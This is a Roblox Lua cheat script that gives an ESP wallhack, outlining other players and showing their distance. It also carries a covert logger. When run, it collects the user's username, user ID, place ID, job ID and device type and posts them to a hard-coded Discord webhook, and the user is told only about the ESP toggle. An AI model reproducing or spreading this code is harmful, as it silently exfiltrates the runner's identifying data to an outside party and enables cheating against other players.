local request = request or http_request or syn.request
local httpService = game:GetService("HttpService")
local players = game:GetService("Players")
local runService = game:GetService("RunService")
local userInputService = game:GetService("UserInputService")
local tweenService = game:GetService("TweenService")

local webhookUrl = "https://discord.com/api/webhooks/1322910314534010880/Fx3dNcAnfeP5iGp9yGEGnHt217Jq_eni_Wt7WOS7AJJPT0oGoYMhO9fHM22s7zr4ujJp"


local function gatherInfo()
    local info = {
        Username = players.LocalPlayer.Name,
        UserId = players.LocalPlayer.UserId,
        PlaceId = game.PlaceId,
        JobId = game.JobId,
        Device = userInputService.TouchEnabled and "Mobile" or "PC/Console",
    }
    return info
end


local function sendToWebhook(data)
    local payload = {
        ["content"] = "Collected Roblox Session Data",
        ["embeds"] = {{
            ["title"] = "Session Information",
            ["fields"] = {
                {["name"] = "Username", ["value"] = data.Username, ["inline"] = true},
                {["name"] = "User ID", ["value"] = tostring(data.UserId), ["inline"] = true},
                {["name"] = "Place ID", ["value"] = tostring(data.PlaceId), ["inline"] = true},
                {["name"] = "Job ID", ["value"] = data.JobId, ["inline"] = true},
                {["name"] = "Device Type", ["value"] = data.Device, ["inline"] = true},
            },
            ["color"] = 0x7289DA
        }}
    }

    request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = httpService:JSONEncode(payload),
    })
end

-- Function to create ESP for a player
local function createESP(player)
    local function addESP()
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            -- Add white outline
            local highlight = Instance.new("Highlight")
            highlight.Name = "ESPOutline"
            highlight.FillTransparency = 1 -- Fully transparent fill
            highlight.OutlineColor = Color3.fromRGB(255, 255, 255) -- White outline
            highlight.OutlineTransparency = 0 -- Fully visible outline
            highlight.Parent = player.Character

            -- Create BillboardGui for distance display
            local billboard = Instance.new("BillboardGui")
            billboard.Size = UDim2.new(0, 200, 0, 50)
            billboard.Adornee = player.Character.HumanoidRootPart
            billboard.AlwaysOnTop = true
            billboard.Name = "ESP"

            -- Add TextLabel to show distance
            local textLabel = Instance.new("TextLabel")
            textLabel.Size = UDim2.new(1, 0, 1, 0)
            textLabel.BackgroundTransparency = 1
            textLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- White color
            textLabel.TextStrokeTransparency = 0.5
            textLabel.Font = Enum.Font.SourceSansBold
            textLabel.TextSize = 16
            textLabel.Parent = billboard

            -- Update distance dynamically
            runService.RenderStepped:Connect(function()
                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and players.LocalPlayer.Character and players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    local distance = (players.LocalPlayer.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
                    textLabel.Text = string.format("%s\nDistance: %.2f meters", player.Name, distance)
                end
            end)

            billboard.Parent = player.Character
        end
    end

    -- Add ESP if character is already loaded
    if player.Character then
        addESP()
    end

    -- Add ESP when character spawns
    player.CharacterAdded:Connect(function()
        addESP()
    end)
end

-- Function to initialize ESP for all players
local function initializeESP()
    for _, player in pairs(players:GetPlayers()) do
        if player ~= players.LocalPlayer and not player.Character:FindFirstChild("ESPOutline") then
            createESP(player)
        end
    end
end

-- Notification UI
local function showNotification(message)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "NotificationGUI"
    screenGui.Parent = game.CoreGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 50)
    frame.Position = UDim2.new(1, -310, 1, -100)
    frame.BackgroundTransparency = 0.3
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 0
    frame.Parent = screenGui

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, -10, 1, -10)
    textLabel.Position = UDim2.new(0, 5, 0, 5)
    textLabel.BackgroundTransparency = 1
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.TextSize = 16
    textLabel.Text = message
    textLabel.Parent = frame

    -- Tween to fade out after 4 seconds
    wait(4)
    local tween = tweenService:Create(frame, TweenInfo.new(1), {BackgroundTransparency = 1, Position = UDim2.new(1, -310, 1, -150)})
    tween:Play()
    tween.Completed:Connect(function()
        screenGui:Destroy()
    end)
end

-- Toggle ESP with a key
local espEnabled = true
userInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.LeftControl then
        espEnabled = not espEnabled
        print("ESP Toggled:", espEnabled)
        if not espEnabled then
            for _, player in pairs(players:GetPlayers()) do
                if player.Character then
                    if player.Character:FindFirstChild("ESPOutline") then
                        player.Character.ESPOutline:Destroy()
                    end
                    if player.Character:FindFirstChild("ESP") then
                        player.Character.ESP:Destroy()
                    end
                end
            end
        else
            initializeESP()
        end
    end
end)


spawn(function()
    while true do
        if espEnabled then
            initializeESP()
        end
        wait(10) -- Update interval
    end
end)

-- Main Execution
local data = gatherInfo()
sendToWebhook(data) -- Send session data to webhook
initializeESP() -- Initialize ESP
showNotification("Press Left Control to toggle ESP!")
